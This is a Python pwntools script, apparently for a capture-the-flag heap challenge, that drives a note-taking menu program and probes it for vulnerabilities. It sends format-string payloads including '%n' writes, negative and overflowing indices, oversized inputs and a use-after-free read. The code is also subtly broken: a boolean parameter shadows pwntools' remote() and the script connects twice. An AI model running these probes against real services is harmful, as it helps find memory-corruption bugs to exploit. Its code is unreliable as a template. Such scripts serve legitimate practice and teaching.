#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
菜单题Pwntools交互脚本
用于与二进制程序进行交互和漏洞利用
"""

from pwn import *
import time
import random
import string

class MenuExploit:
    def __init__(self, binary_path):
        self.binary_path = binary_path
        self.io = None
        
    def connect(self, remote=False, host=None, port=None):
        """连接到目标程序"""
        if remote:
            self.io = remote(host, port)
        else:
            self.io = process(self.binary_path)
        
        # 接收欢迎信息
        self.io.recvuntil(b"Welcome to the All-Pwn-Red-Book App!")
        print("[+] 已连接到程序")
    
    def create_note(self, note_type=1, content="test"):
        """创建笔记 (选项1)"""
        print(f"[+] 创建笔记 - 类型: {note_type}, 内容: {content[:50]}...")
        
        self.io.sendline(b"1")  # 选择菜单1
        self.io.recvuntil(b"NOTE TYPE")
        
        self.io.sendline(str(note_type).encode())  # 笔记类型
        self.io.recvuntil(b"Please enter note content:")
        
        self.io.sendline(content.encode())  # 笔记内容
        
        # 接收响应
        try:
            response = self.io.recvline()
            print(f"[+] 创建笔记响应: {response}")
            return True
        except:
            print("[-] 创建笔记失败")
            return False
    
    def display_notes(self):
        """显示所有笔记 (选项2)"""
        print("[+] 显示所有笔记")
        
        self.io.sendline(b"2")
        
        try:
            response = self.io.recvuntil(b"Pick your main character move")
            print(f"[+] 显示笔记响应: {response}")
            return True
        except:
            print("[-] 显示笔记失败")
            return False
    
    def display_note_content(self, note_num):
        """显示特定笔记内容 (选项3)"""
        print(f"[+] 显示笔记 {note_num} 的内容")
        
        self.io.sendline(b"3")
        self.io.recvuntil(b"Note number")
        
        self.io.sendline(str(note_num).encode())
        
        try:
            response = self.io.recvuntil(b"Pick your main character move")
            print(f"[+] 显示笔记内容响应: {response}")
            return True
        except:
            print("[-] 显示笔记内容失败")
            return False
    
    def set_note_content(self, note_num, content):
        """设置笔记内容 (选项4)"""
        print(f"[+] 设置笔记 {note_num} 的内容: {content[:50]}...")
        
        self.io.sendline(b"4")
        self.io.recvuntil(b"Note number")
        
        self.io.sendline(str(note_num).encode())
        
        try:
            self.io.recvuntil(b"Please enter note content:")
            self.io.sendline(content.encode())
            
            response = self.io.recvuntil(b"Pick your main character move")
            print(f"[+] 设置笔记内容响应: {response}")
            return True
        except:
            print("[-] 设置笔记内容失败")
            return False
    
    def delete_note(self, note_num):
        """删除笔记 (选项5)"""
        print(f"[+] 删除笔记 {note_num}")
        
        self.io.sendline(b"5")
        self.io.recvuntil(b"Note number")
        
        self.io.sendline(str(note_num).encode())
        
        try:
            response = self.io.recvuntil(b"Pick your main character move")
            print(f"[+] 删除笔记响应: {response}")
            return True
        except:
            print("[-] 删除笔记失败")
            return False
    
    def exit_program(self):
        """退出程序 (选项6)"""
        print("[+] 退出程序")
        self.io.sendline(b"6")
    
    def test_basic_functionality(self):
        """测试基本功能"""
        print("\n=== 测试基本功能 ===")
        
        # 创建几个笔记
        for i in range(3):
            content = f"Test note {i} content"
            self.create_note(1, content)
            time.sleep(0.1)
        
        # 显示所有笔记
        self.display_notes()
        
        # 显示特定笔记内容
        self.display_note_content(0)
        
        # 设置笔记内容
        self.set_note_content(0, "Modified content")
        
        # 删除笔记
        self.delete_note(0)
    
    def test_edge_cases(self):
        """测试边界情况"""
        print("\n=== 测试边界情况 ===")
        
        # 测试负数索引
        self.display_note_content(-1)
        self.set_note_content(-1, "test")
        self.delete_note(-1)
        
        # 测试超大数字
        self.display_note_content(999999)
        self.set_note_content(999999, "test")
        self.delete_note(999999)
        
        # 测试超长内容
        long_content = "A" * 10000
        self.create_note(1, long_content)
        self.set_note_content(0, long_content)
    
    def test_format_string(self):
        """测试格式字符串漏洞"""
        print("\n=== 测试格式字符串漏洞 ===")
        
        format_strings = [
            "%x%x%x%x%x%x%x%x",
            "%p%p%p%p%p%p%p%p",
            "%s%s%s%s%s%s%s%s",
            "%n%n%n%n%n%n%n%n",
        ]
        
        for fmt in format_strings:
            print(f"[+] 测试格式字符串: {fmt}")
            self.create_note(1, fmt)
            self.set_note_content(0, fmt)
    
    def test_heap_operations(self):
        """测试堆操作"""
        print("\n=== 测试堆操作 ===")
        
        # 创建多个笔记
        for i in range(10):
            content = f"Heap test note {i}"
            self.create_note(1, content)
        
        # 删除一些笔记
        for i in range(5):
            self.delete_note(i)
        
        # 创建新笔记
        self.create_note(1, "New note after deletion")
        
        # 尝试访问已删除的笔记
        self.display_note_content(0)  # 可能触发UAF
    
    def test_integer_overflow(self):
        """测试整数溢出"""
        print("\n=== 测试整数溢出 ===")
        
        # 测试超大数字
        large_numbers = [0x7fffffff, 0x80000000, 0xffffffff]
        
        for num in large_numbers:
            print(f"[+] 测试数字: {num}")
            self.display_note_content(num)
            self.set_note_content(num, "test")
            self.delete_note(num)
    
    def interactive_mode(self):
        """交互模式"""
        print("\n=== 进入交互模式 ===")
        print("输入 'help' 查看可用命令")
        
        while True:
            try:
                cmd = input("pwn> ").strip()
                
                if cmd == "help":
                    print("可用命令:")
                    print("  create <type> <content> - 创建笔记")
                    print("  display - 显示所有笔记")
                    print("  show <num> - 显示特定笔记")
                    print("  set <num> <content> - 设置笔记内容")
                    print("  delete <num> - 删除笔记")
                    print("  exit - 退出")
                
                elif cmd.startswith("create "):
                    parts = cmd.split(" ", 2)
                    if len(parts) >= 3:
                        note_type = int(parts[1])
                        content = parts[2]
                        self.create_note(note_type, content)
                
                elif cmd == "display":
                    self.display_notes()
                
                elif cmd.startswith("show "):
                    note_num = int(cmd.split()[1])
                    self.display_note_content(note_num)
                
                elif cmd.startswith("set "):
                    parts = cmd.split(" ", 2)
                    if len(parts) >= 3:
                        note_num = int(parts[1])
                        content = parts[2]
                        self.set_note_content(note_num, content)
                
                elif cmd.startswith("delete "):
                    note_num = int(cmd.split()[1])
                    self.delete_note(note_num)
                
                elif cmd == "exit":
                    break
                
                else:
                    print("未知命令，输入 'help' 查看帮助")
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"错误: {e}")
    
    def run_exploit(self):
        """运行完整的漏洞利用测试"""
        try:
            self.connect()
            
            # 运行各种测试
            self.test_basic_functionality()
            self.test_edge_cases()
            self.test_format_string()
            self.test_heap_operations()
            self.test_integer_overflow()
            
            # 进入交互模式
            self.interactive_mode()
            
        except Exception as e:
            print(f"错误: {e}")
        finally:
            if self.io:
                self.io.close()

def main():
    import sys
    
    if len(sys.argv) < 2:
        print("用法: python3 exploit_script.py <binary_path> [remote] [host] [port]")
        sys.exit(1)
    
    binary_path = sys.argv[1]
    remote_mode = len(sys.argv) > 2 and sys.argv[2] == "remote"
    
    exploit = MenuExploit(binary_path)
    
    if remote_mode and len(sys.argv) >= 5:
        host = sys.argv[3]
        port = int(sys.argv[4])
        exploit.connect(remote=True, host=host, port=port)
    else:
        exploit.connect()
    
    exploit.run_exploit()

if __name__ == "__main__":
    main()
